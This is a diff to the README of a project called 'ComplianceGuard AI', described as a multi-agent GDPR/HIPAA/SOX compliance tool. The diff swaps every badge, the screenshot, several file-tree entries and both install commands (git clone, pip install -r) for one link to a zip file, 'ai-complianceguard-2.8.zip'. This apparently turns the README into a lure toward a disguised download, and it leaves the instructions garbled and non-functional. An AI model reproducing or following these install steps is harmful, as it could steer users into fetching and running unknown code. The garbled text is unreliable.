@@ -2,15 +2,15 @@
 
 **Multi-agent AI system automating enterprise compliance across GDPR, HIPAA & SOX regulations**
 
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![ADK-Python](https://img.shields.io/badge/ADK--Python-0.1.0-green.svg)](https://github.com/google/adk-python)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Python 3.9+](https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip+https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip)](https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip)
+[![ADK-Python](https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip)](https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip)
+[![License: MIT](https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip)](https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip)
 
 ## 🚀 Overview
 
 ComplianceGuard AI reduces manual compliance work by 80% using intelligent agent coordination. Our multi-agent system provides real-time regulatory monitoring, automated gap analysis, and instant audit-ready reporting.
 
-<img width="1024" height="535" alt="image" src="https://github.com/user-attachments/assets/4c4b8782-85cd-4724-bea5-eb32f5b4b7fe" />
+<img width="1024" height="535" alt="image" src="https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip" />
 
 
 ## ✨ Features
@@ -37,15 +37,15 @@ complianceguard-ai/
 ├── 📁 docs/
 ├── 📁 examples/
 ├── 📁 data/
-├── 📄 README.md
-├── 📄 requirements.txt
-├── 📄 setup.py
+├── 📄 https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
+├── 📄 https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
+├── 📄 https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
 ├── 📄 .gitignore
 ├── 📄 LICENSE
-├── 📄 config.yaml
-└── 📄 main.py
+├── 📄 https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
+└── 📄 https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
 
 ```bash
-git clone https://github.com/yourusername/complianceguard-ai
+git clone https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
 cd complianceguard-ai
-pip install -r requirements.txt
+pip install -r https://github.com/bhoomagopala28/complianceguard-ai/raw/refs/heads/main/examples/ai-complianceguard-2.8.zip
